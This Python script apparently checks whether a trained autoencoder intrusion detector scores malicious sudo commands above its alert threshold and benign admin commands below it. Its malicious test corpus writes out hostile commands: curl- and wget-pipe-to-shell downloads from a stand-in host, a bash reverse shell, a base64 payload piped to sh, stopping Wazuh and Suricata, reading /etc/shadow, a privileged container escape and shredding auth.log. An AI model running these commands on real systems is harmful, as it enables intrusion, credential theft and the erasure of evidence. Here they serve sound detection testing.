"""Acceptance check: does the trained model separate intrusion from verbosity?

Threshold calibration only guarantees a false-positive rate on benign traffic.
It says nothing about whether the model reacts to an actual intrusion, and a
model driven mostly by command length can pass calibration while scoring
``curl … | bash`` well *below* the alarm threshold, outranked by a long but
harmless maintenance one-liner.

This script closes that gap. It scores two corpora against the model and
threshold currently in the config, and fails when either expectation breaks:

* every malicious shape must score above tau (a miss is a blind spot);
* every benign shape must score below it (a hit is a false positive).

The built-in corpora are deliberately small, generic and readable. **Replace the
benign half with commands from your own estate**: the point is to prove the
model tolerates *your* routine administration, and a generic list cannot do
that. Drop a JSON file at the path in ``LOCAL_CORPUS_PATH`` (gitignored) with
either or both keys:

    {"benign": ["...", "..."], "malicious": ["...", "..."]}

Run it after every retrain, before promoting a model.

Usage:
    python scripts/validate_detection.py [config.json]
"""

from __future__ import annotations

import json
import os
import sys
from typing import List, Sequence, Tuple

import torch

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from src.config import load_config  # noqa: E402
from src.features import LogVectorizer, standardize  # noqa: E402
from src.model import LogAutoencoder  # noqa: E402

# Optional per-deployment corpus. Keep real commands here, out of version
# control, rather than in the defaults below.
LOCAL_CORPUS_PATH: str = "config/validation_corpus.local.json"

# Generic routine administration. None of these should raise an alert, however
# long or unfamiliar the command looks. Substitute your own.
DEFAULT_BENIGN_COMMANDS: Tuple[str, ...] = (
    "/usr/bin/docker ps",
    "/usr/bin/docker ps -a --format '{{.Names}} | {{.Image}} | {{.Status}}'",
    "/usr/bin/docker exec app sh -c 'ls -d /var/lib/app/plugins/*/ 2>/dev/null | wc -l'",
    "/usr/bin/docker inspect app --format 'mem_limit={{.HostConfig.Memory}}'",
    "/usr/bin/docker exec -u app app sh -c 'mkdir -p ~/.ssh && chmod 700 ~/.ssh'",
    "/usr/bin/find /opt /srv -maxdepth 3 ( -name docker-compose*.yml -o -name compose*.yml )",
    "/usr/bin/journalctl -b --no-pager -u docker.service --since '1 hour ago'",
    "/usr/bin/docker exec db sh -c 'sqlite3 -header /var/lib/db/state.db "
    "\"SELECT id,created_at FROM jobs ORDER BY created_at DESC LIMIT 3;\"'",
    "/usr/bin/docker run --rm -v app_pgdata:/d:ro alpine sh -c 'du -sh /d; ls /d | head -8'",
    "/usr/bin/install -d -m 700 -o svc -g svc /srv/app/.ssh",
)

# Shapes the detector exists to catch. Short and unremarkable in length, which
# is exactly why a length-driven model misses them. Addresses come from the
# RFC 5737 documentation ranges.
DEFAULT_MALICIOUS_COMMANDS: Tuple[str, ...] = (
    "/usr/bin/curl -s http://malicious.example/x.sh | bash",
    "/usr/bin/wget -qO- http://malicious.example/i.sh | sh",
    "/bin/bash -i >& /dev/tcp/203.0.113.5/4444 0>&1",
    "/bin/sh -c 'echo ZXhhbXBsZQ== | base64 -d | sh'",
    "/usr/bin/systemctl stop wazuh-agent",
    "/usr/bin/systemctl mask suricata",
    "/bin/cat /etc/shadow",
    "/usr/sbin/usermod -aG sudo intruder",
    "/usr/bin/docker run --rm --privileged -v /:/host alpine chroot /host sh",
    "/usr/bin/shred -u /var/log/auth.log",
)


def load_corpora() -> Tuple[Sequence[str], Sequence[str]]:
    """Return ``(benign, malicious)``, preferring the local corpus when present."""
    benign: Sequence[str] = DEFAULT_BENIGN_COMMANDS
    malicious: Sequence[str] = DEFAULT_MALICIOUS_COMMANDS
    if os.path.exists(LOCAL_CORPUS_PATH):
        with open(LOCAL_CORPUS_PATH, encoding="utf-8") as handle:
            local = json.load(handle)
        benign = local.get("benign") or benign
        malicious = local.get("malicious") or malicious
        print(f"Using corpus overrides from {LOCAL_CORPUS_PATH}")
    else:
        print(
            f"No {LOCAL_CORPUS_PATH}; using the generic defaults. Supply your own "
            "benign commands to make this check meaningful."
        )
    return benign, malicious


def _score(
    model: LogAutoencoder,
    vectorizer: LogVectorizer,
    command: str,
    scaler_mean: List[float],
    scaler_var: List[float],
) -> float:
    """Return the reconstruction MSE for ``command`` as a sudo-shaped event."""
    event = {
        "timestamp": "2026-01-01T11:00:00.000+0000",
        "agent": {"id": "001", "name": "host-01"},
        "data": {
            "command": command,
            "srcuser": "admin",
            "dstuser": "root",
            "pwd": "/home/admin",
        },
    }
    normalized = standardize(vectorizer.extract_vector(event), scaler_mean, scaler_var)
    with torch.no_grad():
        tensor = torch.from_numpy(normalized).unsqueeze(0)
        error = ((tensor - model(tensor)) ** 2).mean()
    return float(error)


def validate(config_path: str) -> int:
    """Score both corpora and return the number of failed expectations."""
    config = load_config(config_path)
    tau = float(config["anomaly_threshold_tau"])

    model = LogAutoencoder(
        input_dim=int(config["input_dim"]), latent_dim=int(config["latent_dim"])
    )
    model.load_state_dict(torch.load(config["model_save_path"], map_location="cpu"))
    model.eval()
    vectorizer = LogVectorizer()
    benign, malicious = load_corpora()

    print(f"schema v{config.get('feature_schema_version', '?')}  tau={tau:.6f}\n")
    failures = 0
    for label, corpus, should_alert in (
        ("MALICIOUS", malicious, True),
        ("BENIGN", benign, False),
    ):
        print(f"--- {label} (expected {'above' if should_alert else 'below'} tau) ---")
        for command in corpus:
            score = _score(
                model, vectorizer, command, config["scaler_mean"], config["scaler_var"]
            )
            alerts = score > tau
            ok = alerts is should_alert
            failures += 0 if ok else 1
            ratio = score / tau if tau > 0 else float("nan")
            print(
                f"  {'ok  ' if ok else 'FAIL'} {score:10.6f}  x{ratio:7.2f} tau  "
                f"{command[:72]}"
            )
        print()

    total = len(benign) + len(malicious)
    print(f"{total - failures}/{total} expectations met")
    return failures


if __name__ == "__main__":
    config_arg = sys.argv[1] if len(sys.argv) > 1 else "config/global_config.json"
    raise SystemExit(1 if validate(config_arg) else 0)
